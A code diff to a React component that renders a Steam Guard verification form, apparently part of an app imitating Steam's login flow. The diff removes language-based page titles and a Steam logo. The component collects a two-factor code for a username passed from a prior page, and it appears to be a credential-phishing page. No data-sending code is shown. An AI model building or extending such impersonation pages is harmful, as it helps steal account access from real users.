@@ -1,11 +1,10 @@
 
-import React, { useState, useEffect } from 'react';
+import React, { useState } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Shield, Loader } from 'lucide-react';
 import { toast } from 'sonner';
-import SteamLogo from '../components/SteamLogo';
 
 const SteamGuard = () => {
   const [guardCode, setGuardCode] = useState('');
@@ -13,24 +12,6 @@ const SteamGuard = () => {
   const navigate = useNavigate();
   const location = useLocation();
   const { username } = location.state || { username: '' };
-
-  // Update page title based on user language
-  useEffect(() => {
-    const userLanguage = navigator.language.split('-')[0];
-    let pageTitle = 'Steam Guard Bekleniyor'; // Default Turkish title
-    
-    if (userLanguage === 'en') {
-      pageTitle = 'Steam Guard Verification';
-    } else if (userLanguage === 'de') {
-      pageTitle = 'Steam Guard Überprüfung';
-    } else if (userLanguage === 'fr') {
-      pageTitle = 'Vérification Steam Guard';
-    } else if (userLanguage === 'es') {
-      pageTitle = 'Verificación de Steam Guard';
-    }
-    
-    document.title = pageTitle;
-  }, []);
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
@@ -64,7 +45,6 @@ const SteamGuard = () => {
     <div className="min-h-screen bg-[#171a21] flex flex-col items-center justify-center p-4">
       <div className="bg-[#1b2838]/70 backdrop-blur-sm p-8 rounded-md shadow-lg max-w-md w-full">
         <div className="text-center mb-6">
-          <SteamLogo className="mx-auto mb-4" />
           <Shield className="h-16 w-16 text-blue-400 mx-auto mb-4" />
           <h1 className="text-xl font-bold text-white">Steam Guard Doğrulama</h1>
           <p className="text-sm text-white/70 mt-2">
